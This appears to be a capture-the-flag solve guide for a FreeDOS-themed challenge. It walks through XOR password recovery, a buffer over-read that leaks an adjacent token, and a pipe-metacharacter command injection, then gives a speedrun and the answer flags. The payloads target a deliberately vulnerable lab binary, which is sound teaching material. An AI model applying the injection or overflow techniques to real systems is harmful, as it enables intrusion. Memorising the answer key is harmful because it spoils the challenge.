# Rust In Peace - Solve Guide

## Connection

```
telnet <host> 7000
```

Press any key at the intro screen to reach the main menu.

---

## Challenge 1: Vault Access (Reverse Engineering)

**Flag:** `CyberSci{SHELTER9_ADMIN_ACCESS}`

### Technique

The admin password is XOR-obfuscated in the binary. Reverse the XOR to recover the plaintext.

### Steps

1. Open `PEACE.COM` in Ghidra or a disassembler.

2. Locate the `validate_credentials` function. It calls `transform_bytes` which performs a repeating XOR.

3. Find the obfuscated password constant in the data section:
   ```
   0x8D, 0xE5, 0xFB, 0xA3, 0x8A, 0xE8, 0xEC, 0xD6
   ```

4. Find the XOR key constant:
   ```
   0xDE, 0xAD, 0xBE, 0xEF
   ```

5. XOR each byte with the repeating key:
   ```
   0x8D ^ 0xDE = 0x53 = 'S'
   0xE5 ^ 0xAD = 0x48 = 'H'
   0xFB ^ 0xBE = 0x45 = 'E'
   0xA3 ^ 0xEF = 0x4C = 'L'
   0x8A ^ 0xDE = 0x54 = 'T'
   0xE8 ^ 0xAD = 0x45 = 'E'
   0xEC ^ 0xBE = 0x52 = 'R'
   0xD6 ^ 0xEF = 0x39 = '9'
   ```

6. Recovered password: **SHELTER9**

7. At the main menu, select option `4` (Admin Login), enter `SHELTER9`.

8. Flag is displayed on successful authentication.

---

## Challenge 2: Classified Archives (Buffer Overflow)

**Flag:** `CyberSci{WASTELANDS_ADMIN_TOKEN}`

**Depends on:** Challenge 1 (admin access required)

### Technique

A bounded buffer overflow in the Archive Search function leaks an adjacent token from memory.

### Steps

1. After authenticating as admin, select option `1` (Select Drive).

2. Select `5` to mount Drive F: (Classified Archives -- admin only).

3. In the F:\ directory browser, select `S` (Search files).

4. At the `SEARCH TERM>` prompt, enter 50+ characters:
   ```
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   ```

5. The system echoes your input. Because the search buffer is only 16 bytes but the echo function reads using the user-supplied length, it reads past the buffer into the adjacent `flag_buffer` which contains the admin token loaded from `F:\flag.txt`.

6. The flag appears in the echoed output after the A's.

### Why It Works

In `main.rs`, `DataBlock` is a `#[repr(C)]` struct with `search_buffer` (16 bytes) immediately followed by `flag_buffer` (64 bytes). The input copies up to 256 bytes into `search_buffer`, and the echo loop reads `input_length` bytes starting from `search_buffer` -- overflowing into `flag_buffer`.

---

## Challenge 3: Core Memory Recovery (Shell Metacharacter Injection)

**Flag:** `CyberSci{CORE_MEMORY_FRAGMENT_RECOVERED}`

**Depends on:** Challenge 2 (admin token required)

### Technique

The VERIFY command passes unsanitized user input to `COMMAND.COM /C DIR`, allowing pipe metacharacter injection to execute arbitrary DOS commands.

### Steps

1. Return to the main menu (press `0` in directory browser, then `0` in drive selection).

2. Select option `5` (Command Console).

3. Enter the admin token from Challenge 2: `CyberSci{WASTELANDS_ADMIN_TOKEN}`

4. At the `WASTELAND:\>` prompt, type `HELP` to see available commands. Note the `VERIFY` command.

5. Enter the injection payload:
   ```
   VERIFY x | TYPE F:\SYSTEM\LOGS\CORE.DAT
   ```

6. The flag is displayed inline.

### Why It Works

`cmd_verify()` constructs the command string `/C DIR <user_input>` and passes it to `exec_with_args("C:\\COMMAND.COM", ...)` with no sanitization. The pipe `|` is interpreted by COMMAND.COM as a metacharacter:

- `DIR x` executes first (produces "File not found")
- `TYPE F:\SYSTEM\LOGS\CORE.DAT` executes after the pipe, displaying the flag file

### Platform Notes

- FreeDOS COMMAND.COM (FreeCom 0.86) supports `|` (pipe) but NOT `&` or `&&` for command chaining.
- The solve path must use pipe, not ampersand.

---

## Full Speedrun

```
# Connect
telnet <host> 7000
# Press any key

# Challenge 1
4                              # Admin Login
SHELTER9                       # Password
# Press any key

# Challenge 2
1                              # Select Drive
5                              # Drive F:
# Press any key
S                              # Search files
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   # 50 A's
# Note the token in the overflow output
# Press any key

# Challenge 3
0                              # Return to drive selection
0                              # Return to main menu
5                              # Command Console
CyberSci{WASTELANDS_ADMIN_TOKEN}   # Enter token
VERIFY x | TYPE F:\SYSTEM\LOGS\CORE.DAT   # Injection
```

**All 3 flags:**
1. `CyberSci{SHELTER9_ADMIN_ACCESS}`
2. `CyberSci{WASTELANDS_ADMIN_TOKEN}`
3. `CyberSci{CORE_MEMORY_FRAGMENT_RECOVERED}`
